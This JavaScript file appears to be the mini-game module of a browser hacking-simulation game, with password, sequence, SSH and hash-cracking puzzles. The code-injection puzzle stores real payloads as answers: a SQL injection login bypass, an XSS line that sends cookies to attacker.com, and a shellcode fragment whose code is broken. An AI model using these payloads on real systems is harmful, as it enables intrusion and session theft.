/**
 * Mini-Games Component
 * Handles interactive hacking challenges and puzzles
 */

class MiniGames {
    constructor() {
        this.overlay = null;
        this.content = null;
        this.currentGame = null;
        this.gameData = null;
        this.onComplete = null;
        this.onFail = null;
        this.attempts = 0;
        this.maxAttempts = 3;
        this.timeLimit = 60; // seconds
        this.timer = null;
    }

    /**
     * Initialize mini-games system
     */
    async init() {
        this.overlay = document.getElementById('minigameOverlay');
        this.content = document.getElementById('minigameContent');
        
        // Bind close button
        document.getElementById('closeMinigame').addEventListener('click', () => {
            this.closeGame();
        });

        // Initialize game data
        this.initializeGameData();
    }

    /**
     * Initialize game data and configurations
     */
    initializeGameData() {
        this.gameConfigs = {
            password: {
                title: 'Password Cracking Challenge',
                description: 'Crack the password to gain access',
                difficulty: 'medium',
                timeLimit: 120,
                maxAttempts: 5
            },
            firewall: {
                title: 'Firewall Bypass Protocol',
                description: 'Navigate through the firewall sequence',
                difficulty: 'hard',
                timeLimit: 90,
                maxAttempts: 3
            },
            injection: {
                title: 'Code Injection Simulator',
                description: 'Inject the correct payload',
                difficulty: 'expert',
                timeLimit: 180,
                maxAttempts: 2
            },
            ssh: {
                title: 'SSH Key Authentication',
                description: 'Use the private key to establish connection',
                difficulty: 'medium',
                timeLimit: 60,
                maxAttempts: 3
            },
            crack: {
                title: 'Hash Cracking Challenge',
                description: 'Crack the password hashes',
                difficulty: 'hard',
                timeLimit: 150,
                maxAttempts: 4
            }
        };
    }

    /**
     * Start a mini-game
     */
    startGame(gameType, data = {}) {
        this.currentGame = gameType;
        this.gameData = data;
        this.attempts = 0;

        const config = this.gameConfigs[gameType];
        if (!config) {
            console.error(`Unknown game type: ${gameType}`);
            return;
        }

        this.maxAttempts = config.maxAttempts;
        this.timeLimit = config.timeLimit;

        // Update overlay title
        document.getElementById('minigameTitle').textContent = config.title;

        // Show overlay
        this.overlay.classList.remove('hidden');

        // Initialize specific game
        switch (gameType) {
            case 'password':
                this.initPasswordGame();
                break;
            case 'firewall':
                this.initFirewallGame();
                break;
            case 'injection':
                this.initInjectionGame();
                break;
            case 'ssh':
                this.initSSHGame();
                break;
            case 'crack':
                this.initCrackGame();
                break;
            default:
                this.showError(`Game type ${gameType} not implemented`);
        }

        // Start timer
        this.startTimer();
    }

    /**
     * Password Cracking Game
     */
    initPasswordGame() {
        const passwords = [
            { hint: 'Company founder\'s last name + founding year', answer: 'nexus2019', clues: ['8 characters', 'contains numbers', 'company related'] },
            { hint: 'Default admin password pattern', answer: 'admin123', clues: ['lowercase + numbers', 'very common', 'starts with a'] },
            { hint: 'Secure server access code', answer: 'Tr0ub4dor&3', clues: ['mixed case', 'special characters', 'leetspeak'] },
            { hint: 'Database connection string', answer: 'db_secure_2024', clues: ['contains underscores', 'year included', 'database related'] }
        ];

        const selectedPassword = passwords[Math.floor(Math.random() * passwords.length)];
        
        this.content.innerHTML = `
            <div class="password-game">
                <div class="game-info">
                    <p><strong>Target:</strong> ${this.gameData.target || 'Secure System'}</p>
                    <p><strong>Hint:</strong> ${selectedPassword.hint}</p>
                    <p><strong>Attempts remaining:</strong> <span id="attempts">${this.maxAttempts}</span></p>
                    <p><strong>Time remaining:</strong> <span id="timer">${this.timeLimit}s</span></p>
                </div>
                
                <div class="clues-section">
                    <h4>Clues:</h4>
                    <ul id="cluesList">
                        ${selectedPassword.clues.map(clue => `<li>${clue}</li>`).join('')}
                    </ul>
                </div>
                
                <div class="input-section">
                    <input type="password" id="passwordInput" placeholder="Enter password..." autocomplete="off">
                    <button id="submitPassword" class="hack-btn">CRACK PASSWORD</button>
                </div>
                
                <div id="feedback" class="feedback"></div>
                
                <div class="progress-section">
                    <div class="hack-progress">
                        <div class="hack-progress-bar" id="crackProgress"></div>
                    </div>
                </div>
            </div>
        `;

        this.passwordAnswer = selectedPassword.answer;
        this.bindPasswordEvents();
    }

    /**
     * Bind password game events
     */
    bindPasswordEvents() {
        const input = document.getElementById('passwordInput');
        const button = document.getElementById('submitPassword');
        
        button.addEventListener('click', () => this.checkPassword());
        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                this.checkPassword();
            }
        });

        input.focus();
    }

    /**
     * Check password attempt
     */
    checkPassword() {
        const input = document.getElementById('passwordInput');
        const guess = input.value;
        const feedback = document.getElementById('feedback');
        
        this.attempts++;
        
        if (guess.toLowerCase() === this.passwordAnswer.toLowerCase()) {
            this.showSuccess('Password cracked successfully!');
            this.completeGame({ type: 'password', target: this.gameData.target });
            return;
        }

        // Provide feedback
        const similarity = this.calculatePasswordSimilarity(guess, this.passwordAnswer);
        let feedbackMsg = '';

        if (similarity > 0.7) {
            feedbackMsg = 'Very close! Check your spelling and case.';
        } else if (similarity > 0.4) {
            feedbackMsg = 'Getting warmer. Some characters are correct.';
        } else {
            feedbackMsg = 'Incorrect password. Try using the clues.';
        }

        feedback.innerHTML = `<div class="error">${feedbackMsg}</div>`;
        
        const attemptsLeft = this.maxAttempts - this.attempts;
        document.getElementById('attempts').textContent = attemptsLeft;

        if (attemptsLeft <= 0) {
            this.failGame('Maximum attempts exceeded');
            return;
        }

        input.value = '';
        input.focus();

        // Show progress
        const progress = (this.attempts / this.maxAttempts) * 100;
        document.getElementById('crackProgress').style.width = `${progress}%`;
    }

    /**
     * Calculate password similarity for hints
     */
    calculatePasswordSimilarity(guess, answer) {
        const maxLength = Math.max(guess.length, answer.length);
        let matches = 0;

        for (let i = 0; i < Math.min(guess.length, answer.length); i++) {
            if (guess[i].toLowerCase() === answer[i].toLowerCase()) {
                matches++;
            }
        }

        return matches / maxLength;
    }

    /**
     * Firewall Bypass Game
     */
    initFirewallGame() {
        const sequences = [
            { pattern: [1, 3, 5, 7], description: 'Odd number sequence' },
            { pattern: [2, 4, 8, 16], description: 'Powers of 2' },
            { pattern: [1, 1, 2, 3, 5], description: 'Fibonacci sequence' },
            { pattern: [3, 6, 9, 12], description: 'Multiples of 3' }
        ];

        const selectedSequence = sequences[Math.floor(Math.random() * sequences.length)];
        this.firewallSequence = [...selectedSequence.pattern];
        const visiblePattern = selectedSequence.pattern.slice(0, -1);

        this.content.innerHTML = `
            <div class="firewall-game">
                <div class="game-info">
                    <p><strong>Objective:</strong> Complete the security sequence to bypass firewall</p>
                    <p><strong>Pattern:</strong> ${selectedSequence.description}</p>
                    <p><strong>Attempts remaining:</strong> <span id="attempts">${this.maxAttempts}</span></p>
                    <p><strong>Time remaining:</strong> <span id="timer">${this.timeLimit}s</span></p>
                </div>
                
                <div class="sequence-display">
                    <h4>Security Sequence:</h4>
                    <div class="sequence-grid">
                        ${visiblePattern.map((num, idx) => 
                            `<div class="sequence-item active">${num}</div>`
                        ).join('')}
                        <div class="sequence-item missing">?</div>
                    </div>
                </div>
                
                <div class="input-section">
                    <input type="number" id="sequenceInput" placeholder="Next number..." min="1" max="100">
                    <button id="submitSequence" class="hack-btn">SUBMIT</button>
                </div>
                
                <div id="feedback" class="feedback"></div>
                
                <div class="firewall-visual">
                    <div class="firewall-barrier">
                        <div class="barrier-layer" style="opacity: 1"></div>
                        <div class="barrier-layer" style="opacity: 0.8"></div>
                        <div class="barrier-layer" style="opacity: 0.6"></div>
                    </div>
                </div>
            </div>
        `;

        this.bindFirewallEvents();
    }

    /**
     * Bind firewall game events
     */
    bindFirewallEvents() {
        const input = document.getElementById('sequenceInput');
        const button = document.getElementById('submitSequence');
        
        button.addEventListener('click', () => this.checkSequence());
        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                this.checkSequence();
            }
        });

        input.focus();
    }

    /**
     * Check sequence answer
     */
    checkSequence() {
        const input = document.getElementById('sequenceInput');
        const guess = parseInt(input.value);
        const feedback = document.getElementById('feedback');
        const correctAnswer = this.firewallSequence[this.firewallSequence.length - 1];
        
        this.attempts++;
        
        if (guess === correctAnswer) {
            this.showSuccess('Firewall bypassed successfully!');
            this.animateFirewallBreach();
            setTimeout(() => {
                this.completeGame({ type: 'firewall', sequence: this.firewallSequence });
            }, 2000);
            return;
        }

        let feedbackMsg = '';
        if (Math.abs(guess - correctAnswer) <= 2) {
            feedbackMsg = 'Very close! Try a nearby number.';
        } else if (Math.abs(guess - correctAnswer) <= 5) {
            feedbackMsg = 'Getting closer. Review the pattern.';
        } else {
            feedbackMsg = 'Incorrect. Analyze the sequence pattern more carefully.';
        }

        feedback.innerHTML = `<div class="error">${feedbackMsg}</div>`;
        
        const attemptsLeft = this.maxAttempts - this.attempts;
        document.getElementById('attempts').textContent = attemptsLeft;

        if (attemptsLeft <= 0) {
            this.failGame('Firewall detection triggered');
            return;
        }

        input.value = '';
        input.focus();
    }

    /**
     * Animate firewall breach
     */
    animateFirewallBreach() {
        const barriers = document.querySelectorAll('.barrier-layer');
        let delay = 0;

        barriers.forEach(barrier => {
            setTimeout(() => {
                barrier.style.opacity = '0';
                barrier.style.transform = 'scaleX(0)';
            }, delay);
            delay += 500;
        });
    }

    /**
     * Code Injection Game
     */
    initInjectionGame() {
        const payloads = [
            {
                description: 'SQL Injection to bypass login',
                code: "' OR '1'='1' --",
                explanation: 'Classic SQL injection that makes the WHERE clause always true'
            },
            {
                description: 'XSS payload for admin cookie theft',
                code: '<script>document.location="http://attacker.com/steal.php?cookie="+document.cookie</script>',
                explanation: 'Redirects with stolen cookies to attacker server'
            },
            {
                description: 'Buffer overflow exploit',
                code: 'A' * 256 + '\\x90\\x90\\x90\\x90\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68',
                explanation: 'Overwrites return address with shellcode'
            }
        ];

        const selectedPayload = payloads[Math.floor(Math.random() * payloads.length)];
        this.injectionAnswer = selectedPayload.code;

        this.content.innerHTML = `
            <div class="injection-game">
                <div class="game-info">
                    <p><strong>Target:</strong> ${this.gameData.target || 'Web Application'}</p>
                    <p><strong>Objective:</strong> ${selectedPayload.description}</p>
                    <p><strong>Attempts remaining:</strong> <span id="attempts">${this.maxAttempts}</span></p>
                    <p><strong>Time remaining:</strong> <span id="timer">${this.timeLimit}s</span></p>
                </div>
                
                <div class="code-editor">
                    <h4>Injection Payload:</h4>
                    <textarea id="payloadInput" placeholder="Enter your injection payload..." rows="6"></textarea>
                </div>
                
                <div class="hint-section">
                    <h4>Hint:</h4>
                    <p>${selectedPayload.explanation}</p>
                </div>
                
                <div class="input-section">
                    <button id="executePayload" class="hack-btn">EXECUTE INJECTION</button>
                    <button id="analyzeTarget" class="analyze-btn">ANALYZE TARGET</button>
                </div>
                
                <div id="feedback" class="feedback"></div>
                
                <div class="terminal-output" id="injectionOutput"></div>
            </div>
        `;

        this.bindInjectionEvents();
    }

    /**
     * Bind injection game events
     */
    bindInjectionEvents() {
        const executeBtn = document.getElementById('executePayload');
        const analyzeBtn = document.getElementById('analyzeTarget');
        
        executeBtn.addEventListener('click', () => this.executePayload());
        analyzeBtn.addEventListener('click', () => this.analyzeTarget());

        document.getElementById('payloadInput').focus();
    }

    /**
     * Execute injection payload
     */
    executePayload() {
        const input = document.getElementById('payloadInput');
        const payload = input.value.trim();
        const feedback = document.getElementById('feedback');
        const output = document.getElementById('injectionOutput');
        
        this.attempts++;
        
        // Simulate payload execution
        output.innerHTML = '<div class="terminal-line">Executing payload...</div>';
        
        setTimeout(() => {
            if (this.checkPayloadValidity(payload)) {
                output.innerHTML += '<div class="terminal-line success">Injection successful!</div>';
                output.innerHTML += '<div class="terminal-line">Access granted to target system.</div>';
                this.showSuccess('Code injection executed successfully!');
                this.completeGame({ type: 'injection', payload: payload });
            } else {
                output.innerHTML += '<div class="terminal-line error">Injection failed!</div>';
                output.innerHTML += '<div class="terminal-line">Payload blocked by security filters.</div>';
                
                feedback.innerHTML = '<div class="error">Injection blocked. Try a different approach.</div>';
                
                const attemptsLeft = this.maxAttempts - this.attempts;
                document.getElementById('attempts').textContent = attemptsLeft;

                if (attemptsLeft <= 0) {
                    this.failGame('Security system triggered');
                }
            }
        }, 2000);
    }

    /**
     * Check if payload is valid (simplified)
     */
    checkPayloadValidity(payload) {
        const validPatterns = [
            /OR.*1.*=.*1/i,
            /<script>/i,
            /document\.location/i,
            /\\x[0-9a-f]{2}/i,
            /UNION.*SELECT/i
        ];

        return validPatterns.some(pattern => pattern.test(payload));
    }

    /**
     * Analyze target for vulnerabilities
     */
    analyzeTarget() {
        const output = document.getElementById('injectionOutput');
        
        output.innerHTML = '<div class="terminal-line">Analyzing target...</div>';
        
        const analysisSteps = [
            'Scanning for SQL injection points...',
            'Checking XSS filters...',
            'Testing buffer overflow vulnerabilities...',
            'Analysis complete.'
        ];

        let step = 0;
        const interval = setInterval(() => {
            if (step < analysisSteps.length) {
                output.innerHTML += `<div class="terminal-line">${analysisSteps[step]}</div>`;
                step++;
            } else {
                clearInterval(interval);
                output.innerHTML += `
                    <div class="terminal-line success">Vulnerabilities found:</div>
                    <div class="terminal-line">- SQL injection in login form</div>
                    <div class="terminal-line">- XSS in comment field</div>
                    <div class="terminal-line">- Buffer overflow in file upload</div>
                `;
            }
        }, 1000);
    }

    /**
     * SSH Key Authentication Game
     */
    initSSHGame() {
        this.content.innerHTML = `
            <div class="ssh-game">
                <div class="game-info">
                    <p><strong>Target:</strong> backdoor.hidden</p>
                    <p><strong>Objective:</strong> Establish SSH connection using private key</p>
                    <p><strong>Attempts remaining:</strong> <span id="attempts">${this.maxAttempts}</span></p>
                    <p><strong>Time remaining:</strong> <span id="timer">${this.timeLimit}s</span></p>
                </div>
                
                <div class="ssh-terminal">
                    <div class="terminal-header">SSH Client v2.1</div>
                    <div class="terminal-body" id="sshOutput">
                        <div class="terminal-line">Connecting to backdoor.hidden...</div>
                    </div>
                </div>
                
                <div class="input-section">
                    <input type="text" id="sshCommand" placeholder="Enter SSH command..." value="ssh -i ~/.ssh/id_rsa root@backdoor.hidden">
                    <button id="connectSSH" class="hack-btn">CONNECT</button>
                </div>
                
                <div id="feedback" class="feedback"></div>
            </div>
        `;

        this.bindSSHEvents();
    }

    /**
     * Bind SSH game events
     */
    bindSSHEvents() {
        const connectBtn = document.getElementById('connectSSH');
        const input = document.getElementById('sshCommand');
        
        connectBtn.addEventListener('click', () => this.connectSSH());
        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                this.connectSSH();
            }
        });
    }

    /**
     * Simulate SSH connection
     */
    connectSSH() {
        const command = document.getElementById('sshCommand').value;
        const output = document.getElementById('sshOutput');
        const feedback = document.getElementById('feedback');
        
        this.attempts++;
        
        const steps = [
            'Establishing connection...',
            'Checking host key...',
            'Loading private key...',
            'Authenticating...'
        ];

        let step = 0;
        const interval = setInterval(() => {
            if (step < steps.length) {
                output.innerHTML += `<div class="terminal-line">${steps[step]}</div>`;
                step++;
            } else {
                clearInterval(interval);
                
                if (command.includes('ssh') && command.includes('id_rsa') && command.includes('root@backdoor.hidden')) {
                    output.innerHTML += '<div class="terminal-line success">Authentication successful!</div>';
                    output.innerHTML += '<div class="terminal-line">Welcome to NEXUS Backdoor Server</div>';
                    output.innerHTML += '<div class="terminal-line">root@backdoor:~# </div>';
                    
                    this.showSuccess('SSH connection established!');
                    this.completeGame({ type: 'ssh', host: 'backdoor.hidden' });
                } else {
                    output.innerHTML += '<div class="terminal-line error">Authentication failed!</div>';
                    output.innerHTML += '<div class="terminal-line">Permission denied (publickey).</div>';
                    
                    feedback.innerHTML = '<div class="error">Check your SSH command and key path.</div>';
                    
                    const attemptsLeft = this.maxAttempts - this.attempts;
                    document.getElementById('attempts').textContent = attemptsLeft;

                    if (attemptsLeft <= 0) {
                        this.failGame('Connection refused by server');
                    }
                }
            }
        }, 1000);
    }

    /**
     * Hash Cracking Game
     */
    initCrackGame() {
        const hashes = [
            { hash: '5d41402abc4b2a76b9719d911017c592', answer: 'hello', type: 'MD5' },
            { hash: 'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d', answer: 'hello', type: 'SHA1' },
            { hash: '098f6bcd4621d373cade4e832627b4f6', answer: 'test', type: 'MD5' },
            { hash: 'a94a8fe5ccb19ba61c4c0873d391e987982fbbd3', answer: 'test', type: 'SHA1' }
        ];

        const selectedHash = hashes[Math.floor(Math.random() * hashes.length)];
        this.hashAnswer = selectedHash.answer;

        this.content.innerHTML = `
            <div class="crack-game">
                <div class="game-info">
                    <p><strong>Target:</strong> Password Hash</p>
                    <p><strong>Hash Type:</strong> ${selectedHash.type}</p>
                    <p><strong>Attempts remaining:</strong> <span id="attempts">${this.maxAttempts}</span></p>
                    <p><strong>Time remaining:</strong> <span id="timer">${this.timeLimit}s</span></p>
                </div>
                
                <div class="hash-display">
                    <h4>Hash to crack:</h4>
                    <div class="hash-value">${selectedHash.hash}</div>
                </div>
                
                <div class="crack-methods">
                    <h4>Cracking Methods:</h4>
                    <button id="dictionaryAttack" class="method-btn">Dictionary Attack</button>
                    <button id="bruteForce" class="method-btn">Brute Force</button>
                    <button id="rainbowTable" class="method-btn">Rainbow Table</button>
                </div>
                
                <div id="crackOutput" class="crack-output"></div>
                
                <div id="feedback" class="feedback"></div>
            </div>
        `;

        this.bindCrackEvents();
    }

    /**
     * Bind crack game events
     */
    bindCrackEvents() {
        document.getElementById('dictionaryAttack').addEventListener('click', () => this.startDictionaryAttack());
        document.getElementById('bruteForce').addEventListener('click', () => this.startBruteForce());
        document.getElementById('rainbowTable').addEventListener('click', () => this.startRainbowTable());
    }

    /**
     * Start dictionary attack
     */
    startDictionaryAttack() {
        const output = document.getElementById('crackOutput');
        output.innerHTML = '<div class="terminal-line">Starting dictionary attack...</div>';
        
        const words = ['admin', 'password', 'test', 'hello', 'world', 'user', 'guest', 'login'];
        let wordIndex = 0;
        
        const interval = setInterval(() => {
            if (wordIndex < words.length) {
                output.innerHTML += `<div class="terminal-line">Trying: ${words[wordIndex]}</div>`;
                
                if (words[wordIndex] === this.hashAnswer) {
                    clearInterval(interval);
                    output.innerHTML += '<div class="terminal-line success">MATCH FOUND!</div>';
                    output.innerHTML += `<div class="terminal-line success">Password: ${this.hashAnswer}</div>`;
                    this.showSuccess('Hash cracked successfully!');
                    this.completeGame({ type: 'crack', method: 'dictionary', password: this.hashAnswer });
                    return;
                }
                wordIndex++;
            } else {
                clearInterval(interval);
                output.innerHTML += '<div class="terminal-line error">Dictionary attack failed.</div>';
                this.handleCrackFailure();
            }
        }, 500);
    }

    /**
     * Start brute force attack
     */
    startBruteForce() {
        const output = document.getElementById('crackOutput');
        output.innerHTML = '<div class="terminal-line">Starting brute force attack...</div>';
        output.innerHTML += '<div class="terminal-line">This may take a while...</div>';
        
        // Simulate brute force (in reality this would take much longer)
        setTimeout(() => {
            if (this.hashAnswer.length <= 5) {
                output.innerHTML += '<div class="terminal-line success">MATCH FOUND!</div>';
                output.innerHTML += `<div class="terminal-line success">Password: ${this.hashAnswer}</div>`;
                this.showSuccess('Hash cracked successfully!');
                this.completeGame({ type: 'crack', method: 'bruteforce', password: this.hashAnswer });
            } else {
                output.innerHTML += '<div class="terminal-line error">Brute force would take too long.</div>';
                this.handleCrackFailure();
            }
        }, 3000);
    }

    /**
     * Start rainbow table lookup
     */
    startRainbowTable() {
        const output = document.getElementById('crackOutput');
        output.innerHTML = '<div class="terminal-line">Loading rainbow table...</div>';
        
        setTimeout(() => {
            output.innerHTML += '<div class="terminal-line">Searching precomputed hashes...</div>';
            
            setTimeout(() => {
                output.innerHTML += '<div class="terminal-line success">MATCH FOUND!</div>';
                output.innerHTML += `<div class="terminal-line success">Password: ${this.hashAnswer}</div>`;
                this.showSuccess('Hash cracked successfully!');
                this.completeGame({ type: 'crack', method: 'rainbow', password: this.hashAnswer });
            }, 2000);
        }, 1000);
    }

    /**
     * Handle crack failure
     */
    handleCrackFailure() {
        this.attempts++;
        const attemptsLeft = this.maxAttempts - this.attempts;
        document.getElementById('attempts').textContent = attemptsLeft;

        if (attemptsLeft <= 0) {
            this.failGame('All cracking methods exhausted');
        }
    }

    /**
     * Start game timer
     */
    startTimer() {
        let timeLeft = this.timeLimit;
        const timerElement = document.getElementById('timer');
        
        this.timer = setInterval(() => {
            timeLeft--;
            if (timerElement) {
                timerElement.textContent = `${timeLeft}s`;
            }
            
            if (timeLeft <= 0) {
                this.failGame('Time limit exceeded');
            }
        }, 1000);
    }

    /**
     * Show success message
     */
    showSuccess(message) {
        const feedback = document.getElementById('feedback');
        if (feedback) {
            feedback.innerHTML = `<div class="success">${message}</div>`;
        }
    }

    /**
     * Show error message
     */
    showError(message) {
        const feedback = document.getElementById('feedback');
        if (feedback) {
            feedback.innerHTML = `<div class="error">${message}</div>`;
        }
    }

    /**
     * Complete game successfully
     */
    completeGame(result) {
        clearInterval(this.timer);
        
        // Update game progress
        if (window.hackerSim) {
            window.hackerSim.updateProgress('challenge_completed', {
                id: `${this.currentGame}_${Date.now()}`,
                type: this.currentGame,
                points: this.calculatePoints(),
                result: result
            });
        }

        setTimeout(() => {
            this.closeGame();
        }, 2000);
    }

    /**
     * Fail game
     */
    failGame(reason) {
        clearInterval(this.timer);
        
        this.showError(`Game failed: ${reason}`);
        
        setTimeout(() => {
            this.closeGame();
        }, 3000);
    }

    /**
     * Calculate points based on performance
     */
    calculatePoints() {
        const basePoints = 100;
        const timeBonus = Math.max(0, this.timeLimit - (this.timeLimit - this.getRemainingTime())) * 2;
        const attemptBonus = Math.max(0, (this.maxAttempts - this.attempts) * 10);
        
        return basePoints + timeBonus + attemptBonus;
    }

    /**
     * Get remaining time
     */
    getRemainingTime() {
        const timerElement = document.getElementById('timer');
        if (timerElement) {
            return parseInt(timerElement.textContent.replace('s', ''));
        }
        return 0;
    }

    /**
     * Close game overlay
     */
    closeGame() {
        clearInterval(this.timer);
        this.overlay.classList.add('hidden');
        this.currentGame = null;
        this.gameData = null;
        this.content.innerHTML = '';
        
        // Refocus terminal input
        const terminalInput = document.getElementById('terminalInput');
        if (terminalInput) {
            terminalInput.focus();
        }
    }
}
